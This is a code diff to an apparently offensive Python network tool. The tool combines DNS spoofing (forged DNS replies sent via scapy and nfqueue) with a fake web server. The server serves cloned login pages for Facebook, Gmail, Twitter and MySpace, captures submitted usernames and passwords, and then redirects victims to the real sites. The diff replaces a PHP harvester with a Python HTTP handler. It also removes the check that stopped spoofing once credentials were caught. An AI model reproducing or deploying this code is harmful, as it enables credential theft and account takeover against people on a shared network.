@@ -1,11 +1,20 @@
 from scapy import *
 from nfqueue import *
 from subprocess import Popen, PIPE, STDOUT
-from shutil import copy
+from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
+from cgi import FieldStorage
 from time import sleep
 from socket import socket, AF_INET, gethostbyname
 from fcntl import ioctl
 from ipaddress import ip_network
+
+conf.verb = 0
+
+Services = {
+    "facebook": "https://www.facebook.com/login.php?login_attempt=1",
+    "gmail": "https://accounts.google.com/ServiceLoginAuth",
+    "twitter": "https://twitter.com/sessions",
+    "myspace": "https://myspace.com/ajax/account/signin"}
 
 
 def nscan(interface):
@@ -85,7 +94,9 @@ def get_if_list():
     f.readline()
     f.readline()
     for l in f:
-        lst.append(l.split(":")[0].strip())
+        interface = l.split(":")[0].strip()
+        if interface != "lo":
+            lst.append(interface)
     return lst
 
 
@@ -190,32 +201,58 @@ class URLInspector(object):
                     self.conn.send(["url", url])
 
 
-class WebServer(object):
+class HTTPHandler(BaseHTTPRequestHandler):
 
-    def __init__(self, service, conn):
+    def __init__(self, service, conn, *args):
         self.service = service
         self.conn = conn
-        credsf = open("/tmp/creds.log", "w+")
-        credsf.write("None")
-        credsf.close()
+        BaseHTTPRequestHandler.__init__(self, *args)
+
+    def do_GET(self):
+        if self.path == "/":
+            self.path = "sites/%s.html" % self.service
+
+        try:
+            f = open(self.path)
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(f.read())
+            f.close()
+            return
+
+        except IOError:
+            self.send_error(404, 'File Not Found: %s' % self.path)
+
+    def do_POST(self):
+        if self.path == "/login":
+            form = FieldStorage(
+                fp=self.rfile,
+                headers=self.headers,
+                environ={'REQUEST_METHOD': 'POST',
+                         'CONTENT_TYPE': self.headers['Content-Type']})
+
+            self.conn.send(["cred", self.service, form["user"].value, form["pass"].value])
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write("<meta http-equiv=\"refresh\" content=\"0; "
+                             "url=%s\" />" % Services[self.service])
+            return
+
+
+class WebServer(object):
+
+    def __init__(self, service, port, conn):
+        self.service = service
+        self.port = port
+        self.conn = conn
+
+    def handler(self, *args):
+            HTTPHandler(self.service, self.conn, *args)
 
     def start(self):
-        copy("sites/%s.html" % self.service, "/tmp/index.html")
-        copy("sites/%s.php" % self.service, "/tmp/%s.php" % self.service)
-        Popen("php -S 0.0.0.0:80 -t /tmp/", shell=True, stdout=PIPE, stderr=STDOUT)
-        while True:
-            sleep(2)
-            with open("/tmp/creds.log", "r") as credsf:
-                lines = credsf.readlines()
-            self.conn.send(("cred " + lines[-1]).split())
-
-    def stop(self):
-        try:
-            Popen("killall php", shell=True, stdout=PIPE)
-            Popen("rm /tmp/%s.php" % self.service, shell=True, stdout=PIPE)
-            Popen("rm /tmp/index.html", shell=True, stdout=PIPE)
-        except:
-            pass
+        server = HTTPServer(('', self.port), self.handler)
+        server.serve_forever()
 
 
 class Spoofer(object):
@@ -247,7 +284,6 @@ class Spoofer(object):
 
         if specific:
             self.domain = domain
-            self.got_creds = False
         else:
             self.domain = domain.split()
 
@@ -277,16 +313,8 @@ class Spoofer(object):
                          an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=self.target)))
 
             if self.specific:
-                try:
-                    with open("/tmp/creds.log", "r") as credsf:
-                        lines = credsf.readlines()
-                        if lines[-1] != "None":
-                            self.got_creds = True
-                except:
-                    pass
-
                 target_domains = [self.domain, ("%s." % self.domain), ("www.%s." % self.domain)]
-                if dns.qd.qname in target_domains and self.got_creds is False:
+                if dns.qd.qname in target_domains:
                     payload.set_verdict(NF_DROP)
                     send(reply)
             else:
